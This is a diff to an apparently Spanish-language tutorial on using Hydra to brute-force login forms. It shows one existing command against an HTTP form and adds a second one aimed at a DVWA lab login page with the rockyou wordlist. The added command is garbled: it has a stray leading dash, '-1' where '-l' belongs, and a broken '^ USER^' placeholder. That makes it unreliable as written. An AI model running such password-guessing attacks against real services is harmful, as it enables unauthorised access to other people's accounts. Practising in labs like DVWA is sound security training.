@@ -43,6 +43,12 @@ hydra -l admin -P diccionario.txt 192.168.1.100 http-post-form "/login.php:user=
 
 Este comando intentará iniciar sesión en un formulario de inicio de sesión HTTP utilizando el nombre de usuario `admin` y probando las contraseñas del archivo `diccionario.txt` en la dirección IP `192.168.1.100`.
 
+**Otro ejemplo:**
+
+```
+-hydra -1 admin -P /usr/share/wordlists/rockyou.txt 192.168.0.52 http-post-form '/dvwa/login.php:username=^ USER^&password=^PASS^&Login=Login:Login failed'
+```
+
 
 **Ejemplo de comando para un ataque de fuerza bruta FTP:**
 ```
